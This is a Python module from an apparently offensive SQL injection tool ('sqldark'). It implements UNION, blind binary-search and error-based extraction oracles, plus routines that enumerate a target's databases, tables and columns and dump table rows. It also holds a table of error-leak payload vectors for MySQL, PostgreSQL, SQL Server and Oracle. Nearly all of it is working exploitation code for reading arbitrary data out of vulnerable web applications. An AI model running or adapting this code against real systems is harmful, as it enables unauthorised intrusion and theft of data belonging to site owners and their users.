"""Data extraction oracles: turn an injection vector into the ability to read
arbitrary scalar values from the database, then enumerate schema and dump data.

Two oracles are supported:
  - UNION oracle: fast, reads the value directly from the visible column.
  - Blind oracle (boolean/time): reads the value character by character using
    binary search over ASCII codes (7 requests per character).
"""
import time
from sqldark.enumeration.dialects import get as get_dialect
from sqldark.techniques import similarity


class UnionOracle:
    """Reads a scalar expression through a UNION visible column."""
    def __init__(self, http, point, detail, log):
        self.http = http
        self.point = point
        self.cols = detail["columns"]
        self.visible = detail["visible"]
        self.prefix = detail["prefix"]
        self.suffix = detail["suffix"]
        self.log = log
        self.marker_l = "zX7"
        self.marker_r = "7Xz"

    def read(self, expr):
        selects = []
        wrapped = f"CONCAT('{self.marker_l}',{expr},'{self.marker_r}')"
        for i in range(self.cols):
            selects.append(wrapped if i == self.visible else "NULL")
        payload = f"{self.prefix} UNION SELECT {','.join(selects)}{self.suffix}"
        payload = self.http._tamper(payload)
        url, data = self.point.build(payload)
        r = self.http.send(url, method=self.point.method, data=data)
        text = r.text
        start = text.find(self.marker_l)
        if start == -1:
            # CONCAT may be unsupported (e.g. SQLite uses ||); retry with ||
            return self._read_pipe(expr)
        start += len(self.marker_l)
        end = text.find(self.marker_r, start)
        if end == -1:
            return None
        return text[start:end]

    def _read_pipe(self, expr):
        wrapped = f"('{self.marker_l}'||{expr}||'{self.marker_r}')"
        selects = [wrapped if i == self.visible else "NULL" for i in range(self.cols)]
        payload = f"{self.prefix} UNION SELECT {','.join(selects)}{self.suffix}"
        payload = self.http._tamper(payload)
        url, data = self.point.build(payload)
        r = self.http.send(url, method=self.point.method, data=data)
        text = r.text
        start = text.find(self.marker_l)
        if start == -1:
            return None
        start += len(self.marker_l)
        end = text.find(self.marker_r, start)
        return text[start:end] if end != -1 else None


class BlindOracle:
    """Reads a scalar expression char at a time via a truth oracle.
    Uses DBMS-specific substring/ascii/length primitives (set via set_dialect)."""
    def __init__(self, http, point, truth_fn, log):
        self.http = http
        self.point = point
        self.truth = truth_fn          # truth_fn(condition_sql) -> bool
        self.log = log
        # Default primitives (MySQL-flavored); override with set_dialect().
        self.substr = "SUBSTRING(({e}),{p},1)"
        self.ascii = "ASCII({c})"
        self.length = "LENGTH(({e}))"

    def set_dialect(self, dialect):
        self.substr = dialect.get("substr", self.substr)
        self.ascii = dialect.get("ascii", self.ascii)
        self.length = dialect.get("length", self.length)

    def _char_at(self, expr, pos):
        ch = self.substr.format(e=expr, p=pos)
        code_expr = self.ascii.format(c=ch)
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if self.truth(f"{code_expr}>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def read(self, expr, max_len=256):
        length = self._length(expr, max_len)
        if length == 0:
            return ""
        out = []
        for pos in range(1, length + 1):
            code = self._char_at(expr, pos)
            if code == 0:
                break
            out.append(chr(code))
            self.log.debug(f"  char {pos}/{length} -> {chr(code)!r}")
        return "".join(out)

    def _length(self, expr, max_len):
        len_expr = self.length.format(e=expr)
        lo, hi = 0, max_len
        while lo < hi:
            mid = (lo + hi) // 2
            if self.truth(f"{len_expr}>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo


class Extractor:
    """Schema enumeration + data dump built on top of an oracle."""
    def __init__(self, oracle, dbms, log):
        self.o = oracle
        self.dbms = dbms
        self.d = get_dialect(dbms)
        self.log = log

    def _q(self, s):
        return self.d["quote"](s)

    def banner(self):
        v = self.o.read(self.d["version"])
        self.log.ok(f"{self.dbms} version: {v}")
        return v

    def current_db(self):
        try:
            db = self.o.read(self.d["current_db"])
            self.log.ok(f"current database: {db}")
            return db
        except Exception:
            return None

    def _count(self, key, **kw):
        expr = self.d[key].format(**kw)
        val = self.o.read(expr)
        try:
            return int(val)
        except (TypeError, ValueError):
            return 0

    def tables(self, db=None):
        dbq = self._q(db) if db else self.d.get("current_db", "DATABASE()")
        try:
            n = self._count("count_tables", db=dbq)
        except KeyError:
            n = self._count("count_tables")
        self.log.info(f"{n} table(s)")
        out = []
        for i in range(n):
            tmpl = self.d["table_at"]
            expr = tmpl.format(i=i, i1=i + 1, db=dbq)
            name = self.o.read(expr)
            if name:
                out.append(name)
                self.log.ok(f"  table: {name}")
        return out

    def columns(self, table, db=None):
        tblq = self._q(table)
        dbq = self._q(db) if db else None
        kw = {"tbl": tblq}
        if dbq:
            kw["db"] = dbq
        try:
            n = self._count("count_cols", **kw)
        except KeyError:
            n = self._count("count_cols", tbl=tblq)
        out = []
        for i in range(n):
            expr = self.d["col_at"].format(i=i, i1=i + 1, **kw)
            name = self.o.read(expr)
            if name:
                out.append(name)
                self.log.ok(f"  {table}.{name}")
        return out

    def dump(self, table, columns, max_rows=50):
        tblq = table
        n = self._count("count_rows", tbl=tblq)
        n = min(n, max_rows)
        self.log.info(f"dumping {n} row(s) from {table}")
        rows = []
        for i in range(n):
            row = {}
            for col in columns:
                expr = self.d["cell"].format(col=col, tbl=tblq, i=i, i1=i + 1)
                row[col] = self.o.read(expr)
            rows.append(row)
            self.log.ok(f"  row {i+1}: {row}")
        return rows


# Per-DBMS error-based leak vectors. {E} is the scalar expression to leak.
# The DB raises an error containing a marker + the value; we parse it back out.
ERROR_LEAK = {
    "MySQL": {
        "vector": "AND extractvalue(1,concat(0x7e,substr(({E}),{P},32)))",
        "chunk": 32,
        "parse": r"XPATH syntax error: '~?(.*?)'",
    },
    "PostgreSQL": {
        "vector": "AND 1=cast((SELECT substr(({E})::text,{P},256)) as int)",
        "chunk": 256,
        "parse": r'invalid input syntax for (?:type )?integer:\s*"(.*?)"',
    },
    "Microsoft SQL Server": {
        "vector": "AND 1=convert(int,substring(({E}),{P},256))",
        "chunk": 256,
        "parse": r"converting the (?:varchar|nvarchar) value '(.*?)' to data type int|value '(.*?)' to data type int",
    },
    "Oracle": {
        "vector": "AND 1=utl_inaddr.get_host_name((SELECT substr(({E}),{P},64) FROM dual))",
        "chunk": 64,
        "parse": r"ORA-\d+: (?:host |)(.*)",
    },
}


class ErrorOracle:
    """Reads a scalar by forcing the DBMS to leak it inside an error message.
    Supports MySQL/MSSQL/PostgreSQL/Oracle. Long values are read in chunks,
    because each engine caps how much text fits in one error."""

    def __init__(self, http, point, dbms, prefix, suffix, log):
        self.http = http
        self.point = point
        self.dbms = dbms
        self.prefix = prefix
        self.suffix = suffix
        self.log = log
        self.cfg = ERROR_LEAK.get(dbms)

    def available(self):
        return self.cfg is not None

    def _one(self, expr, pos):
        import re as _re
        vec = self.cfg["vector"].format(E=expr, P=pos)
        payload = f"{self.prefix} {vec}{self.suffix}"
        payload = self.http._tamper(payload)
        url, data = self.point.build(payload)
        r = self.http.send(url, method=self.point.method, data=data)
        m = _re.search(self.cfg["parse"], r.text, _re.I | _re.S)
        if not m:
            return None
        for g in m.groups():
            if g:
                return g
        return m.group(0)

    def read(self, expr):
        if not self.cfg:
            return None
        chunk = self.cfg["chunk"]
        out, pos = "", 1
        while True:
            part = self._one(expr, pos)
            if not part:
                break
            out += part
            if len(part) < chunk:
                break
            pos += chunk
            if pos > 8192:
                break
        return out or None

